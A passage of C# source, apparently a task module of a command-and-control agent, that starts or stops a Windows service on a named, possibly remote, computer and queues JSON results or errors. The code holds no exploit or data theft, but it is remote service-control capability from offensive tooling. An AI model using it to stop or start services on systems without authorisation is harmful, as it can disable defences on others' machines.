                    {
                        resp = CreateTaskResponse(
                            $"Service {instance.ServiceName} on {parameters.Computer} is already started, and is in state: {instance.Status}",
                            true,
                            "error");
                    }
                    else
                    {
                        instance.Start();
                        ST.Task waitForServiceAsync =
                            new ST.Task(() => { instance.WaitForStatus(ServiceControllerStatus.Running); },
                                _cancellationToken.Token);
                        waitForServiceAsync.Start();
                        ST.Task.WaitAny(new ST.Task[] {waitForServiceAsync}, _cancellationToken.Token);
                        _cancellationToken.Token.ThrowIfCancellationRequested();
                        results.Add(new ServiceResult
                        {
                            DisplayName = instance.DisplayName,
                            Service = instance.ServiceName,
                            CanStop = instance.CanStop,
                            Status = instance.Status.ToString(),
                            Computer = parameters.Computer
                        });
                        resp = CreateTaskResponse(_jsonSerializer.Serialize(results.ToArray()), true);
                    }
                }
                catch (Exception ex)
                {
                    resp = CreateTaskResponse($"Failed to start service. Reason: {ex.Message}", true, "error");
                }
            }
            else if (parameters.Stop)
            {
                try
                {
                    ServiceController stopInstance = new ServiceController(parameters.Service, parameters.Computer);
                    if (stopInstance.Status == ServiceControllerStatus.Stopped ||
                        stopInstance.Status == ServiceControllerStatus.StopPending)
                    {
                        resp = CreateTaskResponse(
                            $"Service {stopInstance.ServiceName} on {parameters.Computer} is already stopped, and is in state: {stopInstance.Status}",
                            true, "error");
                    }
                    else
                    {
                        stopInstance.Stop();
                        ST.Task stopTask = new ST.Task(() => { stopInstance.WaitForStatus(ServiceControllerStatus.Stopped); });
                        stopTask.Start();
                        ST.Task.WaitAny(new ST.Task[]
                        {
                            stopTask
                        }, _cancellationToken.Token);
                        _cancellationToken.Token.ThrowIfCancellationRequested();
                        results.Add(new ServiceResult
                        {
                            DisplayName = stopInstance.DisplayName,
                            Service = stopInstance.ServiceName,
                            CanStop = stopInstance.CanStop,
                            Status = stopInstance.Status.ToString(),
                            Computer = parameters.Computer
                        });
                        resp = CreateTaskResponse(_jsonSerializer.Serialize(results.ToArray()), true);
                    }
                }
                catch (Exception ex)
                {
                    resp = CreateTaskResponse($"Failed to stop service. Reason: {ex.Message}", true, "error");
                }
            }
            else
            {
                resp = CreateTaskResponse($"No valid action given.", true, "error");
            }

                // Your code here..
            // Then add response to queue
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}

#endif